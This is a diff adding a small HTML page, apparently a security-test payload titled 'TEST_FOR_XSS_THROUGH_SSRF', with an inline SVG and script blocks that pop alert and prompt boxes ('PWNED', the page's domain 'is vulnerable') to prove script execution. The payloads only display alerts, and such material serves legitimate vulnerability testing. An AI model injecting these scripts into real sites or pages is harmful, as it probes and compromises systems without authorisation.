@@ -1,0 +1,36 @@
+
+<html>
+<body>
+
+	
+
+		<title>TEST_FOR_XSS_THROUGH_SSRF</title>
+
+		
+
+	
+
+	
+
+		<center>
+			<p>TEST_XSS</p>
+			<!--<img src="./svgfile.svg">-->
+			<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+			<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+			<script type="text/javascript">
+			alert("XSS_THROUGH_SVG");
+			</script>
+			</svg>
+		</center>
+
+		<script>
+		alert(5);
+		prompt('PWNED');
+		alert( document.domain + " is vulnerable!" );
+		
+
+		</script>
+
+	
+
+</body></html>
